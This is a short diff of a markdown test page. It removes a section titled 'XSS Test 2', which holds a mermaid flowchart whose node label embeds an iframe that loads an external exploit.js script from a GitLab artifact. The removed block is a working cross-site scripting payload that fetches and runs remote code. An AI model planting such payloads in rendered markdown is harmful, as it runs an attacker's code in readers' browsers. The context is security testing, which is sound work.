@@ -71,13 +71,6 @@ Hello testing this on 9th Feb
     Testing
 </summary>
 
-## XSS Test 2
-```mermaid  
-%%{init: {"flowchart": {"htmlLabels": "false"}} }%%  
-flowchart  
-  A["<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>'></iframe>"]  
-``` 
-
 
 ## iFrames Test
 
